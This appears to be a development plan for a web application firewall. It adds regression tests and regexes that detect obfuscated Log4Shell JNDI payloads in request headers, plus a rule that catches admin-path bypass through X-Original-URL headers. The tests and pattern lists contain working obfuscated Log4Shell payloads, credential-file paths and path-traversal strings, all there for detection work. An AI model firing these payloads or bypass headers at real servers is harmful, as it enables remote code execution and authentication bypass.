# Phase 1 — P1 (HIGH) Run-6

> **Branch:** `develop`. Two changes — both target existing detectors. Bundle as one PR.

---

## GAP-008b · Log4Shell UA-header obfuscation — verify + (maybe) extend

**Source:** Run-6 §5 + §8 row 1.

### Verified state

`grep -n LOG4SHELL_PATTERNS crates/aegis-security/src/detectors/command_injection.rs` shows 4 patterns:

```rust
// 1. Direct ${jndi:<scheme>://...}
r"(?i)\$\{jndi\s*:\s*(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http|https)\s*:",
// 2. Bare ${jndi:
r"(?i)\$\{jndi\s*:",
// 3. Nested ${${::-j}${::-n}${::-d}${::-i}:...}
r"(?i)\$\{[^}]*\$\{[^}]*j[^}]*\}[^}]*\$\{[^}]*n[^}]*\}[^}]*\$\{[^}]*d[^}]*\}[^}]*\$\{[^}]*i[^}]*\}[^}]*:",
// 4. Case-fold ${${(lower|upper|env|sys|date):X}...}
r"(?i)\$\{[^}]*\$\{(?:lower|upper|env|sys|date)\s*:[^}]*\}[^}]*\}",
```

`HEADER_SCAN_ALLOWLIST` covers `user-agent`, `referer`, `x-api-version`, `x-forwarded-for`, `x-real-ip`, `authorization`, `cookie`, `x-requested-with`.

By inspection, patterns 3 + 4 should match the Run-6 missed payloads:

| QA payload | Should match pattern | Trace |
|---|---|---|
| `${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}` | #3 | `\$\{[^}]*` → `${`, then `\$\{[^}]*j[^}]*\}` → `${::-j}`, etc. |
| `${${lower:j}ndi:ldap://x.com/a}` | #4 | `\$\{[^}]*` → `${`, then `\$\{(?:lower\|...)` → `${lower`, then `\s*:[^}]*\}` → `:j}`, then `[^}]*\}` → `ndi:ldap://x.com/a}` |

**Hypothesis:** the patterns already work, and the QA report's "missed" verdict is a corpus-vs-detector miscommunication (e.g. the harness was running before Run-5 was deployed, OR the harness sent a slightly different payload shape that doesn't match the regex).

### Plan — verify-first

**Step 1 — write regression tests** in `command_injection.rs::tests` covering the QA payloads exactly as shipped:

```rust
// GAP-008b (Run-6) — Log4Shell UA-header obfuscation regression.

#[test]
fn log4shell_ua_nested_obfuscation_blocks() {
    let d = CommandInjectionDetector;
    let u: http::Uri = "/".parse().unwrap();
    let m = http::Method::GET;
    let mut h = http::HeaderMap::new();
    h.insert(
        "user-agent",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}".parse().unwrap(),
    );
    let b = BodyPeek::empty();
    let req = make_view(&m, &u, &h, &b);
    assert!(
        d.inspect(&req).iter().any(|s| s.tag == "command_injection"),
        "nested ${{::-j}}…} obfuscation in UA must trip Log4Shell",
    );
}

#[test]
fn log4shell_ua_lower_obfuscation_blocks() {
    let d = CommandInjectionDetector;
    let u: http::Uri = "/".parse().unwrap();
    let m = http::Method::GET;
    let mut h = http::HeaderMap::new();
    h.insert(
        "user-agent",
        "${${lower:j}ndi:ldap://x.com/a}".parse().unwrap(),
    );
    let b = BodyPeek::empty();
    let req = make_view(&m, &u, &h, &b);
    assert!(
        d.inspect(&req).iter().any(|s| s.tag == "command_injection"),
        "${{${{lower:j}}ndi:…}} case-fold obfuscation in UA must trip Log4Shell",
    );
}

#[test]
fn log4shell_ua_upper_obfuscation_blocks() {
    let d = CommandInjectionDetector;
    let u: http::Uri = "/".parse().unwrap();
    let m = http::Method::GET;
    let mut h = http::HeaderMap::new();
    h.insert(
        "user-agent",
        "${${upper:j}ndi:ldap://x.com/a}".parse().unwrap(),
    );
    let b = BodyPeek::empty();
    let req = make_view(&m, &u, &h, &b);
    assert!(
        d.inspect(&req).iter().any(|s| s.tag == "command_injection"),
        "${{${{upper:j}}ndi:…}} obfuscation in UA must trip Log4Shell",
    );
}

#[test]
fn log4shell_referer_nested_obfuscation_blocks() {
    let d = CommandInjectionDetector;
    let u: http::Uri = "/".parse().unwrap();
    let m = http::Method::GET;
    let mut h = http::HeaderMap::new();
    h.insert(
        "referer",
        "https://example.com/?x=${${::-j}${::-n}${::-d}${::-i}:dns://x.com/a}".parse().unwrap(),
    );
    let b = BodyPeek::empty();
    let req = make_view(&m, &u, &h, &b);
    assert!(
        d.inspect(&req).iter().any(|s| s.tag == "command_injection"),
        "nested obfuscation in Referer must trip Log4Shell",
    );
}
```

**Step 2 — run the tests.**

If green → write a short doc note in `docs/security/detectors/command-injection.md` confirming coverage with the exact payloads. Push as `test(detectors): Log4Shell UA obfuscation regression coverage (GAP-008b)`. Done.

If red → identify which pattern needs tightening:
- The most likely culprit is the `[^}]*` segments not matching brace-nested content. The fix would be to switch to recursive-friendly regex (regex crate doesn't support recursion) OR add an additional looser pattern that just keys on `${${` + `}ndi:` + `://`.
- Pattern #5 candidate: `r"(?i)\$\{\$\{[^}]+\}[^}]*ndi[^}]*\$?[^}]*://"` — minimal coverage for any `${${...}...ndi...://` shape regardless of inner obfuscation.

**Score:** `command_injection::LOG4SHELL` (60 — Critical RCE/CVE tier, unchanged).

### Acceptance

- [ ] All four regression tests green
- [ ] If patterns extended, no FP on the existing 50+ negative tests
- [ ] Doc note in `command-injection.md` showing the exact obfuscation forms covered

---

## GAP-011 · `X-Original-URL` / `X-Rewrite-URL` admin-path bypass

**Source:** Run-6 §5 + §8 row 2.

### Verified state

`ssrf.rs` already scans these two headers but only against `SSRF_PATTERNS` (private IPs, file://, etc.). A bare `X-Original-URL: /admin/users` (a path, not an SSRF URL) doesn't fire because no SSRF pattern matches a relative path.

The vulnerability: some app frameworks (older Rails, IIS, Apache mod_rewrite) honor these headers as a "rewrite the URL before processing" hint. An attacker behind a misconfigured proxy can supply `X-Original-URL: /admin/users` while making a public-route request, and the framework processes the admin path. Auth middleware that gates by URL is bypassed.

### Detection logic

**Why a header_injection sub-rule (not a new detector class):** This is a header-shape attack with a specific bypass primitive — same audit class as XFH poisoning, CRLF injection, and host-header poisoning. Fits cleanly under `header_injection`. New tag `url_override_bypass` for audit clarity.

**Why catch admin-path values specifically:** A bare `X-Original-URL: /` is unlikely benign (the framework's own URL parsing would already produce that), but it's not exploit-shaped either. Specifically dangerous values are:

- Admin-path prefixes: `/admin`, `/administrator`, `/wp-admin`, `/manage`, `/console`, `/internal`, `/__internal`, `/_admin`
- Recon shapes already caught by `recon`: `/.env`, `/wp-config.php`, `/.git/config` — overlap with recon detector but the header-via shape is distinct and stacks signal
- Path-traversal shapes already caught by `path_traversal`: `../`, `%2e%2e/` — stacks signal

The conservative trigger is **admin-path prefix**, which has zero benign use case in production headers.

**Score: 40** (header-heuristic tier — same as CRLF). Justification:
- Header-shape attack on a specific bypass primitive — narrow surface, attacker-controlled.
- Less impact than direct cmdi/sqli (auth bypass requires the framework to honor the header AND the admin path to be unauthenticated).
- Stacks with `recon` and `path_traversal` if the value also contains those shapes — combined risk push past `block_at: 80`.
- Same calibration as XFH poisoning (also 35–40) — both are "header carries an attacker-controlled value the framework trusts."

**Field tag:** `header_injection`, sub-tag `url_override_bypass`. Field name reports the actual header that fired (`x-original-url` or `x-rewrite-url`) so audit grep is easy.

### Plan

Extend `header_injection.rs` with a new helper + check:

```rust
// header_injection.rs additions:

const URL_OVERRIDE_HEADERS: &[&str] = &[
    "x-original-url",
    "x-rewrite-url",
    // Apache / IIS / mod_rewrite variants seen in the wild.
    "x-override-url",
    "x-http-method-override-url",
];

/// Admin-path prefixes that have no business appearing in a
/// URL-override header. Operators with legitimate admin proxies
/// can disable the `header_injection` class via `set_profile`
/// for the affected tier; we don't expose a per-prefix knob
/// because the FP surface is genuinely zero in production.
static ADMIN_PATH_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        r"(?i)^/?(?:admin|administrator|wp-admin|manage|console|internal|_admin|__internal)\b",
        // Recon-shape paths smuggled through URL override.
        r"(?i)/?(?:\.env|wp-config\.php|\.git/config|\.aws/credentials|\.ssh/)",
        // Path-traversal smuggled through URL override.
        r"(?i)\.\.[/\\]|%2e%2e[/\\]|%252e%252e",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("admin-path regex compiles"))
    .collect()
});

fn check_url_override(req: &RequestView<'_>, signals: &mut Vec<Signal>) {
    for &name in URL_OVERRIDE_HEADERS {
        let Some(val) = req.headers.get(name).and_then(|v| v.to_str().ok()) else {
            continue;
        };
        if val.is_empty() {
            continue;
        }
        let decoded = super::url_decode(val);
        for re in ADMIN_PATH_PATTERNS.iter() {
            if re.is_match(val) || re.is_match(&decoded) {
                signals.push(Signal {
                    score: super::scores::header_injection::CRLF,
                    tag: "url_override_bypass".into(),
                    field: name.into(),
                });
                return; // One signal per request — no amplification.
            }
        }
    }
}
```

Wire into the detector's `inspect()` after the existing CRLF / XFH checks. Same pattern as the current XFH check.

**Tests:**
- Positive: `X-Original-URL: /admin/users`, `X-Rewrite-URL: /administrator/index.php`, `X-Original-URL: /.env`, `X-Original-URL: /../../../etc/passwd`, `X-Original-URL: /__internal/health`, encoded variant `%2Fadmin%2Fusers`.
- Negative: `X-Original-URL: /api/users` (legitimate API path), `X-Original-URL: /products/123`, header absent, header empty.

**Doc:** `docs/security/detectors/header-injection.md` — new "URL-override bypass" subsection mirroring the SEC-L002 + GAP-005 entries.

### Score-table catalog update

`crates/aegis-security/src/detectors/scores.rs` — add a row for the new sub-tag:

```rust
ScoreEntry {
    class: "header_injection",
    tag: "url_override_bypass",
    score: header_injection::CRLF,  // 40
    note: "X-Original-URL / X-Rewrite-URL header carrying an admin or recon path — framework auth bypass primitive.",
},
```

`tier_for(40)` returns `"header"` so the dashboard chip will render in the same colour as the XFH and CRLF chips. No changes needed to the dashboard SPA — the new row appears automatically via `/api/detectors`.

### Acceptance

- [ ] All 6+ regression tests green (positives fire, negatives stay quiet)
- [ ] No regression on existing header_injection tests
- [ ] Per-detector doc subsection added with the URL-override pattern table
- [ ] Score-catalog row added; verify it appears in `/api/detectors` GET response under `score_table`
- [ ] No false positives on the clean baseline corpus

**Effort:** ~45 min.

---

## Sequencing

Single bundled PR: `feat(detectors): URL-override-header bypass + Log4Shell UA regression coverage (GAP-008b + GAP-011)`. Both touch `header_injection.rs` / `command_injection.rs`, both add tests + a small pattern; small surface, easy to review together.
